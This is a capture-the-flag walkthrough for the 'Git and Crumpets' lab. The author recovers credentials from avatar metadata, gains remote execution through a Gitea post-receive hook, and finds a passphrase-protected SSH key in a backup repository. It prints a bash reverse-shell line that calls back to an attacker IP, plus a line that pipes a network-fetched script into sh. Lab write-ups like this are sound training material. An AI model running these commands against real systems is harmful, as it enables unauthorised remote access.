# Git and Crumpets

### Git and Crumpets
Nmap scan shows ports 22 and 80. But port 80 redirects me to the rick roll video, so there's nothing on the main page. However I can still enumerate directories. I try to do that, but I see that after a while my IP address gets blocked by the website. Even if I visit the page on a browser I can't do it.<br />
What I try to do next is to restart the machine, and this time run an nmap ACK scan:<br />
![image](https://github.com/user-attachments/assets/18f6a3e7-f522-43ed-8504-b5a383134596)<br />
I try to connect to it but nothing, I get blocked again. So i restart again the machine. This time i decided to run `curl` on the target IP, and here's what I get:<br />
![image](https://github.com/user-attachments/assets/761588ef-1a9f-4bb0-b3c4-4e6846dd69d7)<br />
So I added "git.git-and-crumpets.thm" to my `/etc/hosts` file and visit `http://git.git-and-crumpets.thm`:<br />
![image](https://github.com/user-attachments/assets/b8a10178-6167-4c44-9405-de2caee461cd)<br />
Since I have no credentials, I register a new account, and I find two repositories:<br />
![image](https://github.com/user-attachments/assets/fac69041-0e98-4cce-8923-f8b443b247eb)<br />
Looking at the first repository, if I click on `commits`, I can see 5 commits:<br />
![image](https://github.com/user-attachments/assets/87cd0dc4-840e-4bdd-8682-826b193d264e)<br />
But here's what happens if I click on the three dots in the image above:<br />
![image](https://github.com/user-attachments/assets/ede0ba91-6982-49e8-afc1-fa45c00d5f83)<br />
So I downloaded his avatar using `wget`, and used `exiftool` to read metadata from the image:<br />
![image](https://github.com/user-attachments/assets/3dfb369b-04ee-4509-af85-f94965ff8bdf)<br />
And so I was able to log into scone's account with `scones:Password`.  Now, to gain RCE, I'm going to use something called "git hooks":<br />
![image](https://github.com/user-attachments/assets/51a156ef-f37b-41c1-b998-30b0fa01571d)<br />
A git hook is basically a code that executes everytime an action on the repository gets executed. I'm going to create a hook "post-receive", meaning that it will right after a commit.<br />
The git hook should contain the following code: <br />

    #!/bin/bash 
    bash -i >& /dev/tcp/192.168.0.42/8080 0>&1 # replace ip address with ip address of the attackers computer

First, listen for the netcat connection, then: 

    touch README.md
    git init
    git add README.md
    git commit -m "first commit"
    git remote add origin http://git.git-and-crumpets.thm/scones/test.git
    git push -u origin master
This commands create a new git repository, then it connects the local repository with the remote repository on the target. It the pushes the commit to the remote repository.<br />
So the reverse shell bash script executes. This gets me the user flag. Now for privesc, I decide to run linpeas.sh, but the target machine doesn't have essential tools like netcat or wget, so the only way for me to run linpeas is:

    sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
    cat < /dev/tcp/10.10.10.10/80 | sh #Victim
After enumerating the system for a while I finally found something inside `/var/lib/gitea/data/gitea-repositories/root/backup.git`. There's a repository that contains two branches: master and dotfiles. If I look at the commits of the dotfiles branch, here's what I get:<br />
![image](https://github.com/user-attachments/assets/3809e888-cda5-43eb-bc3e-bf0eb6f6c4b3)<br />
So if I run `git show 0b23539`, I get a private ssh key!:<br />
![image](https://github.com/user-attachments/assets/ad817c8d-05a1-41db-b683-ecd268da2c63)<br />
But this key is protected by a passphrase:<br />
![image](https://github.com/user-attachments/assets/2e38b635-cb5f-43c2-8cbf-728a47ea0cce)<br />
And I got lucky!, since the ssh key is in a file called `Sup3rS3cur3`, I tried to use that as a passphrase and it worked!<br />
![image](https://github.com/user-attachments/assets/4fe00ce9-e496-488b-9666-e746d44bac30)<br />







